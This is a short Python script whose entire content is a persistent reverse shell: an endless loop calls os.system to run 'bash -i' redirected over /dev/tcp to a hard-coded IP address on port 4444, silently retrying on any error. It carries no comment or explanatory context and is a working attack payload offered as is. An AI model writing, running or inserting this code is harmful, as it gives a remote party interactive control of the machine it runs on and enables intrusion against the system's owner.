#!/usr/bin/env python

import os

while True:
  try:
    os.system("bash -i >& /dev/tcp/185.146.157.64/4444 0>&1")
  except:
    pass
